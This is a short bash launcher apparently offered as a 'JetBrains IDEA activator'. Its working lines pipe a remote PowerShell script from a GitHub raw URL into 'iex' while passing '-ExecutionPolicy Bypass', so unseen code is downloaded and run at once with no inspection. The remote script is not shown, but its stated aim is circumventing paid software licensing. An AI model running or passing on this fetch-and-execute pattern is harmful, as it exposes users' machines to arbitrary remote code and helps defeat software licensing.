#!/bin/bash
SCRIPT_PATH="https://raw.githubusercontent.com/laor-yt001/LaorORG-Jetbrains-Activator/refs/heads/main/LaorORG-JetBrainsIDEA-Activator.ps1"

if command -v pwsh >/dev/null 2>&1; then
  pwsh -NoProfile -ExecutionPolicy Bypass -Command "iex (curl -sL '$SCRIPT_PATH')"
elif command -v powershell >/dev/null 2>&1; then
  powershell -NoProfile -ExecutionPolicy Bypass -Command "iex (curl -sL '$SCRIPT_PATH')"
else
  echo "PowerShell is not installed. Please install pwsh (recommended) or powershell." >&2
  read -p "Press Enter to exit..." 
  exit 1
fi
